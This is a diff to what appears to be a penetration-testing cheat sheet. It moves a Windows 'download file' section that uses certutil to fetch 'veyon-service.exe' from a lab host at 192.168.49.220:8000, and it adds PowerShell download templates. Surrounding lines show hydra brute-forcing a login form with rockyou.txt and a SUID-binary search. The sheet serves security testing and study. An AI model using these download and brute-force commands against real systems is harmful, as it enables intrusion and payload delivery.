@@ -74,13 +74,6 @@ hydra -l admin -P ~/Documents/rockyou.txt test.com https-post-form "/login:{\"us
 cewl -d 4 https://192.168.0.1 -w /tmp/wordlists.txt
 ```
 
-### :open_file_folder: download
-
-#### windows
-
-```
-certutil -f -urlcache http://192.168.49.220:8000/veyon-service.exe veyon-service.exe
-```
 ### :open_file_folder: nmap
 
 ```
@@ -303,9 +296,7 @@ find / -user root -perm -4000 -exec ls -ldb {} \;
 
 ## 🖥️ Windows
 
-### :open_file_folder: [icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)
-
-Performs the operation on all specified files in the current directory and its subdirectories.
+[icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls): Performs the operation on all specified files in the current directory and its subdirectories.
 
 ```
 icacls <directory> /t
@@ -325,6 +316,20 @@ RX - Read and execute access
 R - Read-only access
 
 W - Write-only access
+```
+
+download file
+
+```
+certutil -f -urlcache http://192.168.49.220:8000/veyon-service.exe veyon-service.exe
+powershell -Command "Invoke-WebRequest '<URL>' -OutFile <filename>"
+powershell -Command "Invoke-WebRequest \"<URL>\" -OutFile <filename>"
+```
+
+get file hash
+
+```
+certutil -hashfile <file> MD5
 ```
 
 ### :open_file_folder: PowerShell
